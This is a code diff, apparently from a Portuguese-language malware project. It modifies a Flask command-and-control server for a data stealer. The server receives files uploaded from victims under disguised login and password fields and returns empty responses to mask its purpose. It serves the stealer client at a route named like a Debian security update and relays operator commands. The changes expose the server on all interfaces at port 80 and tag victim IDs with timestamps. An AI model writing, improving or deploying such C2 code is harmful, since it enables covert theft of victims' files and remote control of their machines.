@@ -8,8 +8,8 @@ log.setLevel(logging.ERROR)
 
 app = Flask(__name__)
 
-HOST = "localhost"
-PORT = 4443
+HOST = "0.0.0.0"
+PORT = 80
 
 def clear_terminal():
     os.system('clear')
@@ -28,7 +28,7 @@ def login_data():
 def register_command():
     data = request.get_data(as_text=True)
 
-    print(f"\n[+] Comando recebido:\n{data}\nC2_Command > ", end="")
+    print(f"[+] Comando recebido:\n{data}\nC2_Command > ", end="")
 
     with open('command-log.txt', 'a') as f:
         f.write(f"{data}\n---\n")
@@ -42,6 +42,7 @@ def admin_upload():
     file = request.files['file']
 
     victim_id = request.form.get('login', 'unknown')
+    victim_id = victim_id + time.strftime("_%Y%m%d_%H%M%S", time.localtime())
     file_category = request.form.get('password', 'unknown')
     original_path = request.form.get('file', 'unknown')
 
@@ -57,9 +58,9 @@ def admin_upload():
 
         try:
             file.save(save_path)
-            print(f"\n[+] Arquivo recebido.\nC2_Command > ", end="")
+            print(f"[+] Arquivo recebido.\nC2_Command > ", end="")
         except Exception as e:
-            print(f"\n[!] Erro ao salvar arquivo: {e}.\nC2_Command > ", end="")
+            print(f"[!] Erro ao salvar arquivo: {e}.\nC2_Command > ", end="")
     return "", 200                                         # Return an empty response to mask the real purpose
 
 @app.route('/security_debian_x386', methods=['GET'])       # Endpoint to serve the stealer client
@@ -87,11 +88,11 @@ def operator_command_interface():
                 print("[!] Desligando o servidor C2. Pressione Ctrl+C na janela do Flask para sair completamente.")
                 os._exit(0)
             latest_command["cmd"] = cmd
-            print(f"[+] Comando definido: '{cmd}'")
+            print(f"[+] Comando definido: '{cmd}'\nC2_Command > ", end="")
         except EOFError:
-            print("\n[!] EOF recebido. Digite 'exit' para sair.")
+            print("[!] EOF recebido. Digite 'exit' para sair.\nC2_Command > ", end="")
         except KeyboardInterrupt:
-            print("\n[!] Ctrl+C detectado. Digite 'exit' para sair ou pressione Ctrl+C novamente para forçar.")
+            print("[!] Ctrl+C detectado. Digite 'exit' para sair ou pressione Ctrl+C novamente para forçar.\nC2_Command > ", end="")
             continue
 
 def run_flask_app():
